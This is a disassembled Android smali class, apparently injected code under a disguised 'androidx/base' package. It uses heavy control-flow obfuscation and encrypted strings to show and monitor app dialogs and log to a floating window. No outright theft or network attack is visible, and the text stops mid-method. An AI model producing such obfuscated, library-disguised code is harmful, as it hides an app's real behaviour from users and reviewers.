.class public final synthetic Landroidx/base/패배;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final a:I

.field public final b:Z

.field public final c:Ljava/lang/Object;

.field public final d:Ljava/lang/Object;

.field public final e:Ljava/lang/Object;

.field public final f:Ljava/lang/Object;


# direct methods
.method public synthetic constructor <init>(Landroid/app/Activity;ZLandroid/app/AlertDialog;Ljava/lang/String;[I)V
    .locals 1

    const/4 v0, 0x2

    iput v0, p0, Landroidx/base/패배;->a:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Landroidx/base/패배;->c:Ljava/lang/Object;

    iput-boolean p2, p0, Landroidx/base/패배;->b:Z

    iput-object p3, p0, Landroidx/base/패배;->e:Ljava/lang/Object;

    iput-object p4, p0, Landroidx/base/패배;->d:Ljava/lang/Object;

    iput-object p5, p0, Landroidx/base/패배;->f:Ljava/lang/Object;

    return-void
.end method

.method public synthetic constructor <init>(Ljava/lang/Object;Ljava/lang/Object;ZLjava/io/Serializable;Ljava/lang/Object;I)V
    .locals 0

    iput p6, p0, Landroidx/base/패배;->a:I

    iput-object p1, p0, Landroidx/base/패배;->c:Ljava/lang/Object;

    iput-object p2, p0, Landroidx/base/패배;->d:Ljava/lang/Object;

    iput-boolean p3, p0, Landroidx/base/패배;->b:Z

    iput-object p4, p0, Landroidx/base/패배;->e:Ljava/lang/Object;

    iput-object p5, p0, Landroidx/base/패배;->f:Ljava/lang/Object;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 11

    const/4 v2, 0x0

    iget v0, p0, Landroidx/base/패배;->a:I

    packed-switch v0, :pswitch_data_0

    sget-object v0, Landroidx/base/프로세서;->closedPopupIds:Ljava/util/Set;

    iget-object v0, p0, Landroidx/base/패배;->c:Ljava/lang/Object;

    check-cast v0, Landroid/app/Activity;

    const v3, -0x44a9d822

    const-string v1, "\u06d8\u06e0\u06df\u06d7\u06e7\u06e6\u06d8\u06e0\u06da\u06e8\u06d8\u06d6\u06d8\u06dc\u06e8\u06e5\u06d8\u06d8\u06e7\u06e8\u06dc\u06d8\u06e5\u06e0\u06d6\u06d8\u06df\u06e0\u06ec\u06e1\u06e7\u06dc\u06d8\u06e7\u06e0\u06d6\u06df\u06e5\u06dc\u06d8\u06d8\u06ec"

    :goto_0
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const v3, 0x13f7b8c1

    const-string v1, "\u06ec\u06e1\u06eb\u06e7\u06ec\u06e6\u06d8\u06e1\u06da\u06df\u06d8\u06e1\u06e6\u06e5\u06d6\u06e2\u06e7\u06df\u06e6\u06d8\u06da\u06e7\u06e8\u06d8\u06e5\u06d8\u06e5\u06df\u06e8\u06df\u06da\u06e2\u06e6\u06e4\u06e8\u06e8\u06d8\u06e4\u06da\u06e8\u06ec\u06e8\u06eb\u06eb\u06e4\u06e1\u06d8\u06dc\u06db\u06e6\u06d8\u06e7\u06e5\u06d9"

    :goto_1
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_1

    goto :goto_1

    :sswitch_1
    const-string v1, "\u06d7\u06ec\u06e5\u06d6\u06e8\u06e1\u06dc\u06ec\u06eb\u06d8\u06e7\u06e1\u06d8\u06e0\u06d7\u06d8\u06e4\u06dc\u06ec\u06e5\u06d7\u06d9\u06d8\u06d6\u06d8\u06df\u06e4\u06e6\u06d8\u06d8\u06eb\u06d6\u06d8\u06eb\u06ec\u06d7\u06e0\u06e8\u06df\u06ec\u06e4\u06d9\u06e0\u06d9\u06e6\u06d8"

    goto :goto_1

    :sswitch_2
    const-string v1, "\u06e4\u06e5\u06e6\u06e5\u06d8\u06e0\u06d7\u06d7\u06d7\u06e2\u06d9\u06e8\u06d9\u06df\u06ec\u06e5\u06e6\u06d8\u06e7\u06d8\u06d8\u06e2\u06d6\u06e1\u06e8\u06e7\u06e1\u06d8\u06dc\u06d9\u06d7\u06da\u06e4\u06d6\u06df\u06dc\u06d6\u06d8\u06e7\u06e8\u06d8\u06da\u06d6\u06da\u06e0\u06e2\u06e4\u06ec\u06ec\u06d8\u06d8\u06df\u06ec\u06d8\u06d8\u06e4\u06d9\u06ec"

    goto :goto_0

    :sswitch_3
    const v4, 0x613de7fa

    const-string v1, "\u06ec\u06e0\u06e7\u06e5\u06ec\u06e8\u06e7\u06d7\u06d8\u06db\u06e0\u06e5\u06e5\u06df\u06db\u06e8\u06e7\u06d9\u06ec\u06ec\u06dc\u06e7\u06d9\u06df\u06eb\u06dc\u06e4\u06e2\u06d7\u06e0\u06d9\u06e2\u06df\u06e6\u06e5\u06d9\u06dc\u06d8\u06e2\u06db\u06d7\u06e8\u06e7\u06ec\u06e6\u06d8\u06eb\u06e6\u06da\u06da\u06e1\u06d8\u06e0\u06d8\u06e1"

    :goto_2
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_2

    goto :goto_2

    :sswitch_4
    invoke-virtual {v0}, Landroid/app/Activity;->isFinishing()Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, "\u06d8\u06eb\u06e5\u06df\u06e2\u06d8\u06e2\u06d7\u06e7\u06e0\u06eb\u06eb\u06e0\u06e7\u06eb\u06e6\u06e4\u06e8\u06e5\u06d7\u06eb\u06ec\u06e8\u06d6\u06d8\u06d9\u06e0\u06e5\u06da\u06e0\u06da\u06da\u06e7\u06d6\u06d8\u06d6\u06d9\u06e2\u06e2\u06e1\u06d6\u06d8\u06d6\u06d8\u06e8\u06e7\u06eb\u06db\u06df\u06eb\u06d6\u06d8\u06e6\u06df\u06d7\u06e8\u06e4"

    goto :goto_2

    :cond_0
    const-string v1, "\u06ec\u06e5\u06e1\u06d8\u06e6\u06d7\u06e1\u06d8\u06d6\u06d8\u06d9\u06d7\u06e8\u06e0\u06e4\u06d8\u06d8\u06d6\u06d8\u06e2\u06e7\u06d7\u06e1\u06d8\u06d7\u06e1\u06e4\u06d7\u06d8\u06dc\u06da\u06db\u06ec\u06ec\u06db\u06dc\u06d8\u06da\u06e0\u06e5\u06d8\u06e5\u06e4\u06e7\u06ec\u06e1\u06dc\u06d8\u06e4\u06eb\u06df\u06d8\u06d6\u06d8\u06ec\u06d7\u06d6\u06e4\u06e8\u06d7"

    goto :goto_2

    :sswitch_5
    const-string v1, "\u06eb\u06e4\u06e1\u06ec\u06e1\u06e8\u06d8\u06df\u06df\u06e6\u06dc\u06da\u06e8\u06dc\u06db\u06e1\u06d8\u06da\u06e6\u06d6\u06d8\u06d9\u06e8\u06d8\u06d6\u06e2\u06d6\u06e7\u06e5\u06e8\u06d8\u06d7\u06e2\u06e1\u06e8\u06e6\u06e8\u06dc\u06e2\u06d8\u06e1\u06d8\u06e7\u06e7\u06d6"

    goto :goto_2

    :sswitch_6
    const-string v1, "\u06e6\u06d6\u06df\u06e0\u06ec\u06e5\u06d8\u06eb\u06e0\u06d7\u06d9\u06df\u06d8\u06e0\u06df\u06d9\u06d9\u06df\u06e8\u06d8\u06e1\u06e7\u06d6\u06d8\u06e4\u06e7\u06dc\u06dc\u06d9\u06e2\u06e8\u06d9\u06d6\u06d8"

    goto :goto_0

    :sswitch_7
    const-string v1, "\u06e7\u06ec\u06d8\u06d8\u06dc\u06e8\u06d6\u06d8\u06dc\u06eb\u06e8\u06e4\u06e6\u06d9\u06da\u06db\u06d9\u06ec\u06e5\u06dc\u06d8\u06da\u06e8\u06e7\u06d8\u06ec\u06e4\u06d8\u06d8\u06e7\u06db\u06e8\u06da\u06da"

    goto :goto_0

    :sswitch_8
    const-string v1, "\u06e4\u06e1\u06e5\u06d8\u06e6\u06e4\u06d9\u06ec\u06d9\u06e7\u06e6\u06e5\u06d8\u06e2\u06eb\u06ec\u06d8\u06e7\u06eb\u06d9\u06d6\u06e7\u06db\u06da\u06e7\u06dc\u06e5\u06e2\u06e8\u06ec\u06d8\u06db\u06d8\u06d9\u06da\u06dc\u06d8\u06eb\u06dc\u06e8\u06d8\u06dc\u06d6\u06df\u06db\u06d6\u06e5\u06ec\u06d7\u06e4\u06e6\u06da\u06e5\u06dc"

    goto :goto_1

    :sswitch_9
    const v4, -0x13704939

    const-string v1, "\u06e7\u06d9\u06e8\u06d8\u06e2\u06e4\u06d6\u06e4\u06e8\u06d8\u06d8\u06d6\u06eb\u06dc\u06d9\u06db\u06d7\u06d9\u06dc\u06e7\u06d8\u06e1\u06d6\u06e2\u06eb\u06d7\u06e6\u06d8\u06da\u06e1\u06d6\u06e2\u06db\u06d6\u06da\u06d7\u06e8\u06d8\u06d6\u06e4\u06e1\u06eb\u06e4\u06d7\u06df\u06e7\u06db"

    :goto_3
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_3

    goto :goto_3

    :sswitch_a
    invoke-virtual {v0}, Landroid/app/Activity;->isDestroyed()Z

    move-result v1

    if-nez v1, :cond_1

    const-string v1, "\u06d8\u06dc\u06d8\u06e5\u06e5\u06e8\u06d8\u06e6\u06d8\u06d6\u06d8\u06d9\u06eb\u06d8\u06e1\u06ec\u06d6\u06d8\u06da\u06db\u06e1\u06e4\u06e8\u06d8\u06e0\u06e8\u06e5\u06eb\u06e5\u06d6\u06e2\u06db\u06db"

    goto :goto_3

    :cond_1
    const-string v1, "\u06ec\u06d8\u06d6\u06d8\u06e4\u06ec\u06d8\u06d8\u06df\u06db\u06d8\u06e6\u06d9\u06d7\u06e7\u06e2\u06dc\u06ec\u06eb\u06e1\u06e7\u06e0\u06e8\u06e5\u06d9\u06d9\u06dc\u06d8\u06e2\u06d7\u06e6\u06e1\u06e0\u06e0\u06d8\u06e2\u06ec\u06e8\u06df\u06db\u06e2\u06d9\u06e5\u06e8\u06e5\u06d6\u06d8\u06d8\u06dc\u06d7\u06d6\u06d8\u06e0\u06d6\u06d8\u06df\u06eb\u06e0"

    goto :goto_3

    :sswitch_b
    const-string v1, "\u06ec\u06e4\u06e6\u06da\u06ec\u06df\u06e0\u06d8\u06e5\u06dc\u06e8\u06e8\u06d8\u06e6\u06eb\u06dc\u06d8\u06e2\u06e6\u06dc\u06d8\u06e7\u06d6\u06d8\u06da\u06e2\u06e6\u06e6\u06e5\u06d7\u06d8\u06e1\u06d6\u06e1\u06e0\u06e2\u06e2\u06ec\u06e2"

    goto :goto_3

    :sswitch_c
    const-string v1, "\u06d9\u06e6\u06e6\u06e1\u06e8\u06da\u06e6\u06e8\u06da\u06eb\u06e2\u06d6\u06e0\u06eb\u06e5\u06e7\u06d6\u06d7\u06eb\u06e4\u06ec\u06e0\u06d9\u06e7\u06e7\u06d6\u06e6\u06d8\u06e4\u06eb\u06e8\u06d8"

    goto :goto_1

    :sswitch_d
    const-string v1, "3PwdfHrfMcYyMI6BpJqgnwR67q/rBf7EBgCAtoJQ5Z9aNf4=\n"

    const-string v3, "vZ9pFQy2RSM=\n"

    invoke-static {v1, v3}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v3, "XDcl9g==\n"

    const-string v4, "K1ZXmJWI41A=\n"

    invoke-static {v3, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v3}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    const v3, -0x19fce341

    const-string v1, "\u06e2\u06dc\u06d8\u06d8\u06e4\u06e5\u06e5\u06d8\u06df\u06d9\u06da\u06e5\u06d9\u06e5\u06d8\u06d6\u06d9\u06dc\u06e8\u06d7\u06d8\u06d8\u06d6\u06e8\u06df\u06dc\u06e6\u06e5\u06d8\u06d9\u06d6\u06e7\u06d8\u06e7\u06da\u06e0\u06d7\u06e1\u06d9\u06e5\u06e0\u06d9"

    :goto_4
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_4

    goto :goto_4

    :sswitch_e
    const-string v1, "\u06e7\u06eb\u06d6\u06d8\u06e5\u06e4\u06dc\u06d8\u06e0\u06df\u06d9\u06db\u06e5\u06d6\u06e7\u06e5\u06e4\u06e8\u06d9\u06df\u06e7\u06d6\u06d9\u06e4\u06e6\u06dc\u06d8\u06e8\u06da\u06e0\u06dc\u06e6\u06d8\u06d8\u06ec\u06d9\u06da\u06e4\u06df\u06eb\u06da\u06e1\u06d6\u06d8\u06e5\u06db\u06e1\u06d8\u06e4\u06ec\u06db\u06e8\u06ec\u06d6\u06e6\u06e7\u06d9\u06e6\u06e4\u06e2"

    goto :goto_4

    :sswitch_f
    const-string v1, "\u06e2\u06e5\u06eb\u06da\u06eb\u06e8\u06df\u06e6\u06df\u06dc\u06da\u06df\u06e8\u06e1\u06e2\u06e2\u06d9\u06e1\u06ec\u06e6\u06e6\u06d7\u06d6\u06db\u06ec\u06da\u06eb\u06e6\u06e8\u06d8\u06e2\u06e1\u06e6\u06db\u06e8\u06e8\u06d8\u06e6\u06dc\u06dc\u06e2\u06e7\u06e6\u06d8\u06e0\u06e7\u06ec\u06e1\u06e0\u06db\u06dc\u06d6\u06eb\u06df\u06e1\u06e8"

    goto :goto_4

    :sswitch_10
    const v4, 0x6e81f9e6

    const-string v1, "\u06ec\u06e5\u06e6\u06e1\u06e5\u06e6\u06d8\u06e5\u06df\u06d8\u06d8\u06e2\u06e4\u06d8\u06e0\u06e2\u06e8\u06e7\u06df\u06ec\u06ec\u06df\u06e6\u06e4\u06eb\u06e7\u06d8\u06e2\u06ec\u06d8\u06e4\u06e8\u06d8\u06e0\u06eb\u06df\u06d9\u06db\u06e8\u06d8"

    :goto_5
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_5

    goto :goto_5

    :sswitch_11
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v5, 0x18

    if-ge v1, v5, :cond_2

    const-string v1, "\u06d9\u06eb\u06e6\u06d8\u06da\u06e8\u06d7\u06d8\u06d7\u06dc\u06d8\u06da\u06eb\u06eb\u06d9\u06e5\u06e7\u06d8\u06df\u06d8\u06e5\u06e6\u06e4\u06e8\u06eb\u06d6\u06e6\u06d8\u06e8\u06eb\u06e4\u06e8\u06e1\u06e5\u06d6\u06df\u06e6\u06dc\u06d6\u06da\u06e4\u06e2\u06e6\u06d8\u06da\u06d9\u06e6"

    goto :goto_5

    :cond_2
    const-string v1, "\u06d6\u06d8\u06e7\u06d8\u06d8\u06d8\u06e1\u06d8\u06e8\u06e0\u06eb\u06d7\u06dc\u06d9\u06dc\u06da\u06e4\u06e1\u06d6\u06e8\u06d8\u06dc\u06e4\u06e1\u06d8\u06d9\u06e4\u06ec\u06df\u06df\u06e6\u06d8\u06e1\u06ec\u06d6\u06d8\u06dc\u06e8\u06e4\u06e8\u06e2\u06e5\u06db\u06d8\u06d8\u06e5\u06dc\u06e5\u06d6\u06e5\u06e1\u06df\u06e4\u06dc\u06d8"

    goto :goto_5

    :sswitch_12
    const-string v1, "\u06ec\u06e1\u06dc\u06db\u06e1\u06db\u06e4\u06e8\u06e1\u06e2\u06e0\u06ec\u06eb\u06df\u06e6\u06e6\u06df\u06d7\u06e8\u06eb\u06d9\u06dc\u06e6\u06e6\u06e6\u06dc\u06d8\u06e0\u06e5\u06db\u06e8\u06df\u06ec\u06df\u06eb\u06d8\u06d8\u06e0\u06e0\u06e4\u06e8\u06e4\u06dc\u06e2\u06d8\u06d8\u06d7\u06d8\u06eb"

    goto :goto_5

    :sswitch_13
    const-string v1, "\u06ec\u06d9\u06e1\u06d8\u06e4\u06db\u06d7\u06ec\u06e6\u06e6\u06d8\u06e5\u06e7\u06d8\u06d8\u06e8\u06db\u06dc\u06e8\u06eb\u06d7\u06e0\u06da\u06e0\u06df\u06e8\u06e7\u06d7\u06df\u06d8\u06e6\u06e0\u06e6\u06e4\u06e1\u06d8\u06e7\u06d8\u06e6"

    goto :goto_4

    :sswitch_14
    move v4, v2

    :goto_6
    iget-object v1, p0, Landroidx/base/패배;->e:Ljava/lang/Object;

    check-cast v1, Landroid/app/AlertDialog;

    iget-object v2, p0, Landroidx/base/패배;->f:Ljava/lang/Object;

    check-cast v2, [I

    iget-object v3, p0, Landroidx/base/패배;->d:Ljava/lang/Object;

    check-cast v3, Ljava/lang/String;

    const v6, 0x5654ee81

    const-string v5, "\u06e2\u06e7\u06e8\u06d8\u06da\u06e4\u06db\u06eb\u06e5\u06e6\u06d8\u06e2\u06e8\u06d8\u06e4\u06e7\u06d8\u06d7\u06e4\u06d9\u06e7\u06d7\u06e2\u06e2\u06db\u06e5\u06d6\u06e0\u06d8\u06e5\u06d8\u06e7\u06e2\u06da\u06d7\u06d8\u06e8\u06d6\u06e6\u06d9\u06d9\u06d6\u06d8\u06d7\u06dc\u06ec\u06e6\u06da\u06d7\u06e1\u06e7\u06d8\u06d7\u06eb\u06e5"

    :goto_7
    invoke-virtual {v5}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_6

    goto :goto_7

    :sswitch_15
    invoke-static {v1}, LKvrUY/RiiGL/Utils;->monitorDialog(Landroid/app/Dialog;)V

    new-instance v4, Landroidx/base/경로;

    invoke-direct {v4, v1, v0}, Landroidx/base/경로;-><init>(Landroid/app/Dialog;Landroid/app/Activity;)V

    invoke-virtual {v4, v3}, Landroidx/base/경로;->show(Ljava/lang/String;)V

    invoke-virtual {v1}, Landroid/app/Dialog;->getWindow()Landroid/view/Window;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    move-result-object v0

    new-instance v3, Landroidx/base/신문;

    const/4 v4, 0x3

    invoke-direct {v3, v1, v2, v4}, Landroidx/base/신문;-><init>(Ljava/lang/Object;Ljava/lang/Object;I)V

    invoke-virtual {v0, v3}, Landroid/view/View;->post(Ljava/lang/Runnable;)Z

    :goto_8
    :sswitch_16
    return-void

    :sswitch_17
    iget-boolean v1, p0, Landroidx/base/패배;->b:Z

    move v4, v1

    goto :goto_6

    :sswitch_18
    const-string v5, "\u06e8\u06e2\u06e1\u06d8\u06e4\u06df\u06dc\u06d8\u06e2\u06d6\u06e7\u06e1\u06d6\u06e0\u06e0\u06e2\u06df\u06e6\u06db\u06dc\u06d9\u06dc\u06da\u06dc\u06e7\u06db\u06ec\u06df\u06da\u06e2\u06e0\u06d8\u06e4\u06d8\u06dc\u06e0\u06d8\u06e2\u06e6\u06df\u06e5\u06d8\u06e4\u06e6\u06d6"

    goto :goto_7

    :sswitch_19
    const v7, -0xe532e1e

    const-string v5, "\u06d6\u06df\u06dc\u06e2\u06d9\u06d6\u06e2\u06e1\u06d8\u06d8\u06d7\u06e5\u06e8\u06d8\u06e6\u06d9\u06eb\u06d7\u06e2\u06e8\u06df\u06e1\u06e0\u06e6\u06e5\u06da\u06e8\u06e1\u06db\u06ec\u06e2\u06e0"

    :goto_9
    invoke-virtual {v5}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

    sparse-switch v8, :sswitch_data_7

    goto :goto_9

    :sswitch_1a
    if-eqz v4, :cond_3

    const-string v5, "\u06e0\u06e5\u06d7\u06e4\u06d7\u06d7\u06e2\u06e1\u06d8\u06e7\u06ec\u06ec\u06eb\u06e8\u06e1\u06d8\u06e7\u06e4\u06e8\u06d8\u06e4\u06e4\u06e1\u06d8\u06e5\u06e1\u06dc\u06e7\u06e4\u06ec\u06d8\u06e0\u06e5\u06d8\u06da\u06da\u06e8\u06e2\u06dc\u06e8\u06d8\u06e5\u06d7\u06e8\u06d8\u06da\u06e8\u06d6\u06d8"

    goto :goto_9

    :cond_3
    const-string v5, "\u06e4\u06d9\u06d8\u06d8\u06d9\u06eb\u06e0\u06df\u06eb\u06dc\u06d6\u06db\u06e1\u06d8\u06e8\u06d6\u06d7\u06d8\u06e7\u06e1\u06d8\u06d9\u06e1\u06e8\u06d6\u06e0\u06e8\u06d8\u06d9\u06da\u06ec\u06e8\u06d8"

    goto :goto_9

    :sswitch_1b
    const-string v5, "\u06e5\u06db\u06eb\u06e4\u06d8\u06da\u06d7\u06e0\u06dc\u06df\u06eb\u06d8\u06db\u06e5\u06e6\u06e6\u06df\u06df\u06e8\u06d6\u06d8\u06e6\u06d6\u06e6\u06e2\u06e7\u06e4\u06d6\u06e2\u06e5\u06d8\u06d8\u06e7\u06d7\u06d7\u06d7\u06e8\u06ec\u06eb\u06df\u06e8\u06da\u06db\u06df\u06e5\u06df\u06d9\u06e8\u06d8"

    goto :goto_9

    :sswitch_1c
    const-string v5, "\u06db\u06dc\u06e1\u06e6\u06e1\u06d7\u06d6\u06e5\u06e7\u06d8\u06e2\u06e0\u06df\u06eb\u06ec\u06e5\u06d8\u06e1\u06e6\u06e8\u06d8\u06eb\u06e4\u06db\u06d6\u06d9\u06e6\u06da\u06e8\u06dc\u06ec\u06d7\u06e6\u06d8\u06e6\u06da\u06e1\u06d8\u06d7\u06e6\u06e6\u06eb\u06d8\u06dc\u06db\u06e0\u06d6"

    goto :goto_7

    :sswitch_1d
    const-string v5, "\u06da\u06e6\u06d6\u06df\u06da\u06d8\u06d8\u06e4\u06d9\u06e5\u06e2\u06e5\u06d8\u06e6\u06eb\u06d7\u06eb\u06dc\u06e0\u06ec\u06e1\u06e2\u06df\u06d6\u06da\u06d9\u06e4\u06d8\u06df\u06e6\u06d8\u06e8\u06d8\u06df\u06d9\u06ec\u06d8\u06d8\u06d7\u06e5\u06df\u06e7\u06e1\u06df\u06db\u06dc\u06df\u06da\u06e0\u06df\u06e0\u06e1\u06e2\u06e6\u06e2"

    goto :goto_7

    :sswitch_1e
    invoke-virtual {v1}, Landroid/app/Dialog;->show()V

    invoke-static {v1, v2}, LKvrUY/RiiGL/Utils;->a(Landroid/app/AlertDialog;[I)V

    :try_start_0
    invoke-virtual {v1}, Landroid/app/Dialog;->getWindow()Landroid/view/Window;

    move-result-object v0

    invoke-static {v0}, Lj$/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v0}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "afOfnYAs3eB175+SmBbJ\n"

    const-string v4, "Gpv68exzrZI=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/View;->setTag(Ljava/lang/Object;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_8

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    :sswitch_1f
    const-string v0, "qxi4UlLfeI59ySiDqVODxC3vZBfCKqaOdsIpvJ5Rv9AtwFPShzjqy3acZqw=\n"

    const-string v1, "ynvMOyS2DGs=\n"

    invoke-static {v0, v1}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "n0uz4g==\n"

    const-string v2, "6CrBjK3sGRI=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_8

    :pswitch_0
    sget-boolean v0, Landroidx/base/복원;->a:Z

    :goto_a
    new-instance v4, Ljava/util/concurrent/CountDownLatch;

    const/4 v0, 0x1

    invoke-direct {v4, v0}, Ljava/util/concurrent/CountDownLatch;-><init>(I)V

    new-instance v7, Ljava/util/ArrayList;

    invoke-direct {v7}, Ljava/util/ArrayList;-><init>()V

    const-string v0, "RsLevl3XUMgVm9HKEvMClxL8uNJ6uin4RfD7vnX/\n"

    const-string v1, "o35eW/pctXE=\n"

    invoke-static {v0, v1}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "bc6S3A==\n"

    const-string v2, "BKD0s4+3oFY=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Landroidx/base/패배;->c:Ljava/lang/Object;

    check-cast v0, Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v8

    :goto_b
    invoke-interface {v8}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    iget-object v1, p0, Landroidx/base/패배;->d:Ljava/lang/Object;

    check-cast v1, Landroid/content/Context;

    const v3, -0x121dd3ac

    const-string v0, "\u06e5\u06e5\u06d8\u06da\u06d8\u06d9\u06d8\u06e8\u06e8\u06eb\u06db\u06e0\u06d6\u06e7\u06e5\u06d9\u06d9\u06e8\u06df\u06eb\u06e7\u06ec\u06e0\u06e1\u06eb\u06dc\u06d8\u06d8"

    :goto_c
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v3

    sparse-switch v5, :sswitch_data_8

    goto :goto_c

    :sswitch_20
    :try_start_1
    invoke-virtual {v4}, Ljava/util/concurrent/CountDownLatch;->await()V

    :goto_d
    const v2, -0x383d5fd0

    const-string v0, "\u06e6\u06d7\u06e7\u06d9\u06e4\u06d9\u06e1\u06e5\u06e1\u06d8\u06e6\u06da\u06e1\u06da\u06e5\u06e5\u06e4\u06e7\u06d9\u06e5\u06e6\u06e1\u06d8\u06e2\u06d8\u06e5\u06dc\u06ec\u06e5\u06e6\u06d6\u06e0\u06e2\u06e8\u06e8\u06d8\u06dc\u06e0\u06eb"

    :goto_e
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_3

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_9

    goto :goto_e

    :sswitch_21
    const-string v0, "oaPVyKV+I5TwzOSs3FN60/OPupK1xuvc4LiwvrceTLavhcA=\n"

    const-string v2, "RypVLjn3yzs=\n"

    invoke-static {v0, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v2, "qrFhRA==\n"

    const-string v3, "3dATKhZuJc8=\n"

    invoke-static {v2, v3}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "OlMVGptbYaFrPCR+4nY45mh/ekCL526pTj8Fcu5VBOZzTw==\n"

    const-string v2, "3NqV/AfSiQ4=\n"

    invoke-static {v0, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const v3, 0x5418f15d

    const-string v0, "\u06df\u06e7\u06eb\u06e8\u06e2\u06d8\u06e6\u06e8\u06d6\u06e8\u06e1\u06db\u06d9\u06d9\u06e5\u06eb\u06df\u06dc\u06d8\u06e6\u06dc\u06eb\u06e6\u06db\u06e5\u06d8\u06df\u06e5\u06ec\u06eb\u06e4\u06dc"

    :goto_f
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_a

    goto :goto_f

    :sswitch_22
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v3

    invoke-direct {v0, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v3, Landroidx/base/전송;

    const/4 v4, 0x6

    invoke-direct {v3, v4, v1, v2}, Landroidx/base/전송;-><init>(ILandroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {v0, v3}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :sswitch_23
    const-wide/16 v0, 0x3e8

    :try_start_2
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_1

    goto/16 :goto_a

    :catch_1
    move-exception v0

    goto/16 :goto_a

    :sswitch_24
